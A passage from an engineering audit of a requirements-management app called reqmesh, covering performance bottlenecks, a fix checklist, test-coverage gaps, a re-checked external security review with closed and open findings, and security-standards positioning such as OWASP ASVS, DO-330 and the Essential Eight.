| `router.py:327-338` | Saving **any** description triggers a full collection scan looking for cascade children — the most frequently-hit path in the app. |
| `extra_routes.py:390-402`, `:584-590`; `component_routes.py:40` | `list_*()` **inside** per-id loops in bulk delete/reparent and component validation. |
| `router.py:176-247` | `next_uid` does a full scan plus `itertools.product` over 26⁴ = 457k combinations, on every "new requirement" click. |

---

## PERF-3 — Blocking I/O on the event loop, single worker 📄 STATIC

All ~148 routes are `async def` doing blocking `open()`/`glob()`/`os.replace()` — and in places
`subprocess.run(["git", ...])` — directly on the event loop. `asyncio.to_thread` is used in 12
places, **none** in the data path. Production runs `--workers 1` (`Dockerfile.prod:59`).

Requests are therefore **serialised, not merely slow**. One user opening Metrics on a large
project freezes every other user's requests, SSE heartbeats and health checks for the duration.

**Fix (highest leverage per unit effort).** Change the data routes from `async def` to plain
`def` — Starlette then runs them in its threadpool automatically. Mechanical, no logic change.

---

## PERF-4 — Pagination saves bytes, not work 📄 STATIC

`router.py:261-277` applies `limit` *after* the whole collection is parsed. Many list routes
(specifications, definitions, analysis cases, verification cases, change requests, risks,
comments, decisions) return the entire raw list when params are omitted, with **no cap at all**.
Fully unpaginated: `/requirements/tree`, `/components/tree`, `/traces`, `/coverage`, `/metrics`,
`/quality`, `/evaluation`, `/gap-analysis`, `/backlog`.

The client defeats the cap — `client.ts:573-577` hardcodes `limit: '2000'` and discards `total`,
so past 2000 requirements the parent dropdown, graph, relations and bulk-edit lookups all operate
on a silently truncated set.

**Fix.** Cap at ~200 default / 500 max; return `{id: path}` lazily so pagination slices *before*
parsing; page properly in the client or surface a hard error.

---

## PERF-5 — Unbounded memory 📄 STATIC

- `event_bus.py:28` — `asyncio.Queue()` with **no `maxsize`**, so the `except asyncio.QueueFull`
  handler at `:42-43` is dead code. A backgrounded tab accumulates events until OOM.
- `event_bus.py:25` — presence entries are only cleaned via `leave()` in a `finally`; a hard TCP
  drop leaks a roster entry permanently.
- `rate_limit.py:6` — `_window_attempts` never evicted.
- The event bus is **per-process**, so any second worker or pod silently breaks presence and
  live updates.

---

## PERF-6 — Git auto-commit per mutation 📄 STATIC

`main.py:113-157` runs `git add -A` + `git commit` after **every** mutating request.
`git add -A` stats the entire working tree (~100-300 ms on 10k files) before the commit starts.
There is no per-project serialisation, so two concurrent mutations collide on `.git/index.lock`
and one is logged-and-dropped — **silently losing that revision from history**. UI bulk delete
issues one request per id → 100 full tree walks queued behind each other.

**Fix.** An `asyncio.Lock` keyed by project id; debounce commits into a 2-5 s window (as pushes
already are); `git add -- <changed paths>` instead of `-A`.

---

## PERF-7 — Frontend 📄 STATIC

- **No virtualisation library** anywhere. `TraceMatrixPage.tsx:279-288` builds O(S×T) `<td>`s
  with an O(L) `.filter`/`.find` **per cell** — unusable well before 1k links.
- `GraphPane.tsx` has four O(n²) passes over `reqs` (`:720`, `:753`, `:766`, `:778`, `:1139`), all
  fixable with the `byParent` map pattern `RequirementsPage.tsx:117-127` already builds.
- ELK layout runs on the **main thread** (`:195`, no worker URL).
- `entityIndex.ts:150-158` — the command-palette index fetches **six full collections** and is
  keyed on `dataVersion`, so **every mutation** invalidates and refetches all six. Palette search
  is unmemoised and undebounced over 15k+ rows per keystroke.

---

# 4. Suggested order

- [x] **1.** Patch **SEC-1** — remove the second `unquote`, validate with `safe_id` — **DONE**, 6 regression tests added
- [x] **2.** Fix **BUG-1** and **BUG-2** — broken endpoint + 500-on-corrupt-file — **DONE**, 9 regression tests added
- [x] **3.** Fix **BUG-3** trace deletion; stop `mode=replace` deleting before it parses (**BUG-5**) — **DONE**, 11 regression tests added
- [x] **4.** Sanitise descriptions server-side; restrict the WeasyPrint fetcher (**SEC-2/3**) — **DONE**, 22 regression tests added
- [x] **5.** **PERF-1** — fast loader on the read path + mtime cache — **DONE**, comments verified preserved; 6x cold / 722x warm
- [ ] **6.** **PERF-3** — `async def` → `def` on data routes *(mechanical; still open)*
- [x] **7.** Locking on users/traces/cascade (**BUG-4**); admin-gate the git remote (**SEC-4**) — **DONE**
- [x] **8.** Read-authorization model + configurable `permissions` (**SEC-5**) — **DONE** via the `require_auth` middleware and deployment profiles

---

# 5. Test coverage gaps

The riskiest code is the least tested — which is why BUG-1 and BUG-2 shipped.

| Risk area | Current coverage |
|---|---|
| Concurrency (`_file_lock`, `save_users`, traces, cascade) | **none** — no threaded/parallel test exists |
| `/change-requests/bulk`, `/bulk-delete` | **none** → BUG-1 undetected |
| Malformed CSV (short rows, unknown id header, replace failure path) | only well-formed 14-column CSVs → BUG-5 undetected |
| Corrupt YAML in a collection | **none** → BUG-2 undetected |
| `build_flat_tree` orphans / parent cycles | **none** (happy path only) |
| Workflow with custom `states` and no `transitions` | **none** |
| Cascade depth > 1 | **none** |
| `build_impact` determinism / cyclic derivation | 10 tests, none asserting step **order** |
| Evaluator crash inputs (non-numeric measurement, `expr: null`, deep rollup) | ÷0, cycles and unknown refs covered; these are not |
| Frontend hooks/components | **none** — all 81 tests are pure utilities (`orthoRoute`, `autoLink`, `graphColors`, `semanticZoom`, `entityIndex`, plain store setters). `undo.ts`, `WhatIfContext`, `GraphPane`, `RequirementDetailPage`, `TraceMatrixPage` are entirely untested. |

**Cheapest high-value additions:** a test that `POST /change-requests/bulk` returns 200; a ragged-CSV
import test; a `build_flat_tree` test with a dangling parent; a `undo.ts` test asserting the entry
is popped when `entry.undo()` rejects.

---

# 6. External security review (former `SEC_REVIEW.md`)

A separate review of 25 July 2026 assessed reqmesh from the public `README.md`
and the repository file listing, without access to the source tree. It numbered
its findings `F-01`…`F-29`. Its code-level conclusions were re-checked against
the implementation on 27 July 2026 — "verified" below means the behaviour was
exercised, not that a changelog claimed it.

Where a finding overlaps §1, the §1 entry is authoritative: it was reproduced
against a running instance, and the external review was not.

## 6.1 Closed

| Finding | Closed by | Overlaps |
| --- | --- | --- |
| F-02 anonymous read | `require_auth` defaults true outside `personal`; `require_auth_middleware` | SEC-5 |
| F-03 self-registration | off by default; `registration_domain_allowlist` | — |
| F-04 bootstrap credential | `0600` file, never logged; `password_change_required` forces rotation; the file is deleted only after the **admin** has rotated | — |
| F-05 proxy IP | `rate_limit.py` walks XFF right-to-left against `proxy_trusted_cidr`; progressive lockout | SEC-7 |
| F-06 access-control matrix | `test_permissions.py` generates from the live route table — 81 of 92 mutating routes asserted | SEC-5 |
| F-07 JWT / token storage | `algorithms=["HS256"]` pinned; cookies + double-submit CSRF, no `localStorage` token | — |
| F-08 enumeration | constant response on forgot-password; dummy bcrypt hash on unknown user | — |
| F-09 validate-on-load | `services/load_guard.py`, applied at the store's cache-fill path | BUG-2 |
| F-10 YAML | ruamel rt/safe only; no `yaml.load`/`FullLoader` | — |
| F-11 / F-12 git | list-form subprocess, scheme allowlist, `redact_url()` at every logging site | SEC-1, SEC-4 |
| F-13 `/scan` containment | resolved and asserted inside the project root; symlinks skipped | SEC-6 |
| F-15 ReqIF XXE | DOCTYPE rejected outright | — |
| F-16 XLSX bombs | compression-ratio and uncompressed-size caps; exact row count | — |
| F-17 stored XSS | sanitised on write, on load, and in the publisher; no `dangerouslySetInnerHTML` | SEC-2 |
| F-18 LaTeX | escaped throughout, temp dir, 120 s timeout | — |
| F-19 evaluator | float coercion bounds magnitude; `OverflowError` → `EvalError` | BUG-9 |
| F-20 headers / CSP | FastAPI middleware + `Caddyfile` + `nginx.conf` | — |
| F-21 CORS | a wildcard origin now **refuses to start** (credentials are always sent) | — |
| F-22 images | `data:` images only, raster only — SVG refused | SEC-3 |
| F-23 / F-24 rate limits | SSE connection caps; analysis and publish budgets | SEC-7 |
| F-25 container | non-root, `read_only`, `cap_drop: [ALL]`, `no-new-privileges` | — |
| F-27 `SECURITY.md` | present | — |
| F-29 CI pipeline | `.github/workflows/security.yml` — CodeQL, Semgrep, Bandit, pip-audit, npm audit, gitleaks, Trivy | — |

## 6.2 Open

| Finding | State |
| --- | --- |
| **F-01 MFA / SSO** | Not started. No OIDC, WebAuthn or TOTP. The Essential Eight ML2 blocker, and the largest remaining item. |
| **F-14 audit-trail integrity** | No signed commits, no hash-chained history. The append-only remote pattern is not yet documented in `DEPLOYMENT.md`. |
| **F-26 SBOM / signed releases** | No CycloneDX, no cosign; base images pinned by tag, not digest. |
| **F-28 code signing** | Electron runtime hardening is done; Windows/macOS signing is not. Whether this blocks a release depends on whether the desktop build is a supported channel or a convenience — still undecided. |
| **F-09 residual** | The load guard covers ids, HTML and structure. `references[].path` containment is handled downstream in `references.py` rather than at load. |
| **F-16 residual** | Bounds are on the archive and the row count; per-cell content is not bounded. |

## 6.3 Two constraints on the read-side guard

Both are load-bearing and easy to reintroduce by "tidying" `load_guard.py`.
`tests/test_load_guard.py` enforces them.

1. **It must not fill in absent fields.** `compute_fingerprint` canonicalises over
   the normative fields, so injecting `type: functional` into a file that omitted
   it changes that requirement's fingerprint and flips it to "unreviewed" —
   silently invalidating the review state of every existing project. That is a
   false-assurance failure caused by the control meant to prevent it.
2. **It must not coerce unrecognised enum values.** The vocabularies are open in
   practice: `type: design` is not in `RequirementType`, but the coverage model
   matches a requirement's `type` against a downstream `needs` entry, so
   rewriting it to `functional` silently breaks the trace. The write path
   validates against the enums; the read path must not second-guess data a human
   put there deliberately.

## 6.4 Standards positioning

Retained from the external review because nothing in §1–§5 covers it.

**Pursue:**

| Standard | Rationale | Commitment |
| --- | --- | --- |
| **OWASP ASVS 5.0 Level 2** | The verification target — a checklist that can be driven to completion and cited. Prioritise V1 (encoding/injection), V4 (access control), V5 (file handling), V8 (data protection). | Ongoing, self-assessed |
| **NIST SP 800-218 (SSDF)** + SBOM | The framing US and allied primes ask for in supply-chain attestations. | Low, mostly documentation |
| **OpenSSF Scorecard + Best Practices badge** | The open-source-native equivalent, automated, visible on the repo. | One weekend |
| **ISO/IEC 29147 / 30111** | Disclosure intake and handling. | Hours |
| **CIS Docker Benchmark** | Directly applicable to `Dockerfile.prod`. | One evening |

**Decline:** ISO/IEC 27001 (certifies an operating organisation; reqmesh is not
a service), Common Criteria (recertification-per-release is incompatible with an
actively developed solo project), IEC 62443 (applies to OT environments).

**DO-330 tool qualification** is the significant one, and it is not a security
standard. The demo project is a Cessna 172S and the example requirement carries a
`DO-178C` attribute; if a customer holds certification-credible requirements in
reqmesh, the tool is plausibly qualifiable at **TQL-5** — a development tool whose
errors could insert an undetected error into airborne software. The road-vehicle
and industrial equivalents are ISO 26262-8 clause 11 and IEC 61508-3 clause
7.4.4 (T2). Full qualification is out of scope, but the *preparatory* work
overlaps almost entirely with things worth doing anyway: reqmesh's own
requirements captured in reqmesh, structured test evidence traced to them,
configuration-management records, and a tamper-evident history (F-14).
**Recommendation:** don't chase TQL-5; make the choices that keep it reachable,
and say so — "designed with DO-330 TQL-5 qualification in mind; qualification
data package not yet produced" is honest, differentiating, and free. This is
also what makes F-14 worth more than its severity suggests.

**Essential Eight.** ASD confirmed on 24 June 2026 that it will be retired over
roughly two years and replaced by a domain-based *Essentials* series. Both run in
parallel; deprecation ~mid-2027, retirement ~mid-2028. The practical consequence
for reqmesh is none — the underlying controls are unchanged and tenders still
reference the Essential Eight — but write any published mapping so it can be
re-titled rather than rewritten. Four of the eight land on reqmesh's side:

| Control | Position | Action |
| --- | --- | --- |
| **Multi-factor authentication** | **Fails.** No MFA of any kind; phishing-resistant MFA required from ML2. | F-01 |
| **Patch applications** | Weak. No advisory channel, no SBOM. | F-26 |
| **Restrict administrative privileges** | Reasonable. Role tiers and lockout guardrails are sound. | Closed (F-03, F-04) |
| **Regular backups** | **Strong — a genuine differentiator.** Git-native YAML is versioned, restorable, human-readable, diffable and offsite via push. ML2+ additionally requires tested restoration and that unprivileged accounts cannot modify or delete backups. | Document the append-only remote in `DEPLOYMENT.md` (F-14) |

Application control affects the Electron build only (F-28).

Be explicit in any published mapping that the Essential Eight says essentially
nothing about application security — it is IT hygiene, and ASD says so directly,
pointing to the ISM, NIST CSF or ISO 27002 for coverage. ASVS answers "is the
code sound"; the Essential Eight answers "is the environment fit to run it".
reqmesh needs both, and they are different documents.
